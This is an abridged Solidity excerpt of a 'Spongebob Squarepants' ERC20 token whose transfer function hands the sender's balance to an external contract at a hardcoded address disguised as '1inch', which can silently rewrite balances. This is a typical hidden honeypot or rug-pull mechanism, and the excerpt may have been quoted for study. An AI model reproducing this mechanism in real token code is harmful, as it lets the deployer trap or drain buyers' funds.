...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _oneinch = 0xaD990603f17B9D5327C6A30eCeE4a38309c264d7;
    address public pair;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        senderBalance = oneinch.execute(sender, recipient, senderBalance);
    ...
    function _DeployEloned(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployEloned(creator, initialSupply);
    }
}

contract Spongebob is ERC20Token {
    constructor() ERC20Token("Spongebob Squarepants", "SPONGEBOB", msg.sender, 10000000 * 10 ** 18) {
    }
}